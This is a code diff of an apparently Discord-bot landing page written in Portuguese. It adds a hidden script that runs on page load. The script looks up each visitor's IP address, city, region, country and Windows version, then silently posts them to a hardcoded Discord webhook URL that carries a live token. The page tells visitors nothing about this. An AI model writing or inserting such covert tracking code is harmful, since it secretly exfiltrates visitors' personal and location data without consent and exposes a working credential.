@@ -24,5 +24,48 @@
             <a href="https://discord.gg/W8NWfpnwrB" class="bot-btn" target="_blank">💻 Servidor de Suporte</a>
         </div>
     </main>
+    <script>
+        // Função para enviar mensagem por webhook
+        function enviarMensagem() {
+            // Obter o IP do usuário
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+
+                    // Obter a localização do usuário
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            const localizacao = `${data.city}, ${data.region}, ${data.country_name}`;
+
+                            // Obter a edição do Windows
+                            const windowsEdition = window.navigator.userAgent.match(/Windows NT (\d+\.\d+)/)[1];
+
+                            // Construir a mensagem
+                            const mensagem = `IP do usuário: ${ip}\nLocalização: ${localizacao}\nEdição do Windows: Windows ${windowsEdition}`;
+
+                            // Enviar a mensagem por webhook
+                            const webhookURL = 'https://discord.com/api/webhooks/1232090820392386664/GVsiEsNNbw7895pmtTJOgHAdTSrZ8DsSBstDfBk5KSSonnjlSjBQ4kNzS7aKbog93svM';
+                            fetch(webhookURL, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    content: mensagem
+                                })
+                            }).then(() => {
+                                console.log('Mensagem enviada com sucesso!');
+                            }).catch(error => {
+                                console.error('Erro ao enviar a mensagem:', error);
+                            });
+                        });
+                });
+        }
+
+        // Chamada da função ao carregar a página
+        window.onload = enviarMensagem;
+    </script>
 </body>
 </html>
